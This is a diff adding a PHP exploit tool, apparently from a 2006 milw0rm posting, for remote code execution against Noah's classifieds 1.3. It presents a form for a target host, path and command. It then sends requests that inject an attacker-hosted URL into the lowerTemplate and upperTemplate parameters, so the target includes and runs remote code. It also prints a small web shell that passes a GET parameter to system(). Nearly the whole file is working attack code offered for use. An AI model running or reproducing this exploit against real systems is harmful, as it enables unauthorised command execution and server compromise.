@@ -1,0 +1,226 @@
+<?php
+#               Noah's classifieds 1.3 Remote Code Execution                  #
+#                                by trueend5                                  #
+#                  Computer Security Researchers Institute                    #
+#                           [http://www.KAPDA.ir]                             #
+#                        *** Functions From rgod ***                          #
+#                       Condition:register_globals=On                         #
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout", 5);
+ob_implicit_flush (1);
+
+echo'<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>Noah`s classifieds 1.3 Remote Code Execution</title>
+</head>
+
+<body bgcolor="#FFCCFF">
+
+<p align="center"><font size="4" color="#0000FF">Noah`s classifieds 1.3 Remote
+Code Execution</font></p>
+<p class="Stile6" align="center"><font size="3" color="#FF0000">by trueend5</font></p>
+<p align="center"><font size="4" color="#008000">Computer Security Researchers
+Institute</font></p>
+<font SIZE="3">
+<p align="center"><a href="http://www.kapda.ir">KAPDA</a></p>
+<p align="center"><img border="0" src="http://irannetjob.com/pics/ph-logo.png" width="120" height="121"></p>
+</font>
+<table width="90%">
+  <tbody>
+    <tr>
+      <td width="43%" align="left">
+        <form name="form1" action="'.$SERVER[PHP_SELF].'" method="post">
+          <p><input name="host" size="20"> <span class="Stile5"><font color="#FF0000">*</font> hostname (ex:www.sitename.com)</span></p>
+          <p><input name="path" size="20"> <span class="Stile5"><font color="#FF0000">*</font> path (ex: /classifieds/
+          or just / )</span></p>
+          <p><input name="CMD" size="20"> <span class="Stile5"><font color="#FF0000">*</font> specify a
+          command</span></p>
+          <p><input name="LOCATION" size="20"><span class="Stile5"><font color="#FF0000">*</font> remote
+          location ( ex: http://www.somesite.com/sys.php)</span></p>
+          <p><input name="port" size="20"><span class="Stile5">specify a port&nbsp;
+          (default is 80)</span></p>
+          <p><input name="proxy" size="20"><span class="Stile5">send exploit
+          through an HTTP proxy (ip:port)</span></p>
+          <p align="center"> <span class="Stile5"><font color="#FF0000">&nbsp;&nbsp;
+          * </font>fields are required</span></p>
+          <p align="center"><span class="Stile5">-----------------------------------------------------------------------------------------------</span></p>
+          
+          <p><input type="submit" value="Start" name="Submit"></p>
+        </form>
+      </td>
+    </tr>
+  </tbody>
+</table>
+</body></html>';
+function show($headeri)
+{
+  $ii=0;$ji=0;$ki=0;$ci=0;
+  echo '<table border="0"><tr>';
+  while ($ii <= strlen($headeri)-1){
+    $datai=dechex(ord($headeri[$ii]));
+    if ($ji==16) {
+      $ji=0;
+      $ci++;
+      echo "<td>&nbsp;&nbsp;</td>";
+      for ($li=0; $li<=15; $li++) {
+        echo "<td>".$headeri[$li+$ki]."</td>";
+		}
+      $ki=$ki+16;
+      echo "</tr><tr>";
+    }
+    if (strlen($datai)==1) {
+      echo "<td>0".$datai."</td>";
+    }
+    else {
+      echo "<td>".$datai."</td> ";
+    }
+    $ii++;$ji++;
+  }
+  for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++) {
+    echo "<td>&nbsp&nbsp</td>";
+  }
+  for ($li=$ci*16; $li<=strlen($headeri); $li++) {
+    echo "<td>".$headeri[$li]."</td>";
+  }
+  echo "</tr></table>";
+}
+
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+
+function sendpacket() 
+{
+  global $proxy, $host, $port, $packet, $html, $proxy_regex;
+  $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+  if ($socket < 0) {
+    echo "socket_create() failed: reason: " . socket_strerror($socket) . "<br>";
+  }
+  else {
+    $c = preg_match($proxy_regex,$proxy);
+    if (!$c) {echo 'Not a valid proxy';
+    die;
+    }
+  echo "OK.<br>";
+  echo "Attempting to connect to ".$host." on port ".$port."...<br>";
+  if ($proxy=='') {
+    $result = socket_connect($socket, $host, $port);
+  }
+  else {
+    $parts =explode(':',$proxy);
+    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
+    $result = socket_connect($socket, $parts[0],$parts[1]);
+  }
+  if ($result < 0) {
+    echo "socket_connect() failed.\r\nReason: (".$result.") " . socket_strerror($result) . "<br><br>";
+  }
+  else {
+    echo "OK.<br><br>";
+    $html= '';
+    socket_write($socket, $packet, strlen($packet));
+    echo "Reading response:<br>";
+    while ($out= socket_read($socket, 2048)) {$html.=$out;}
+    echo nl2br(htmlentities($html));
+    echo "Closing socket...";
+    socket_close($socket);
+  }
+  }
+}
+
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.htmlentities($host); die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy';die;
+    }
+    $parts=explode(':',$proxy);
+    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);echo nl2br(htmlentities($html));
+}
+
+$host=$_POST[host];
+$path=$_POST[path];
+$port=$_POST[port];
+$CMD=$_POST[CMD];
+$LOCATION=$_POST[LOCATION];
+
+
+if (($host<>'') and ($path<>'') and ($CMD<>'') and ($LOCATION<>''))
+{
+  $port=intval(trim($port));
+  if ($port=='') {$port=80;}
+  if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {die('Error... check the path!');}
+  if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+  $host=str_replace("\r\n","",$host);
+  $path=str_replace("\r\n","",$path);
+  $CMD=urlencode($CMD);
+
+  $packet="GET ".$p."index.php?com=".$CMD."&lowerTemplate=".$LOCATION." HTTP/1.1\r\n";
+  $packet.="User-Agent: Shareaza v1.x.x.xx\r\n";
+  $packet.="Host: ".$host."\r\n";
+  $packet.="Connection: Close\r\n\r\n";
+  show($packet);
+  sendpacketii($packet);
+  if (eregi("kapda",$html)) {echo "Exploit succeeded"; die;}
+                           else {echo "Trying Step 2...<br>";}
+
+  $packet="GET ".$p."index.php?com=".$CMD."&upperTemplate=".$LOCATION." HTTP/1.1\r\n";
+  $packet.="User-Agent: SnoopRob/x.x\r\n";
+  $packet.="Host: ".$host."\r\n";
+  $packet.="Connection: Close\r\n\r\n";
+  show($packet);
+  sendpacketii($packet);
+  if (eregi("kapda",$html)) {echo "Exploit succeeded"; }
+                           else {echo "Exploit failed...";}
+}
+else
+{echo "Note: on remote location which supports php, prepare this code in<br>
+        http://remote_location/sys.php<br>";
+ echo  nl2br(htmlentities("
+<?php
+        echo '<?php echo\"kapda\"; ini_set(\"max_execution_time\",0);
+        \$com = \$_GET[\"com\"];
+        system (\"\$com\"); ?>';
+?>
+
+        Or on remote location that Doesnt support php, prepare this code in
+        http://remote_location/sys.php
+
+
+<?php
+ echo\"kapda\";
+ ini_set(\"max_execution_time\",0);
+ \$com = \$_GET[\"com\"];
+ system (\"\$com\");
+?>
+        "));}
+
+?>
+
+# milw0rm.com [2006-02-22]
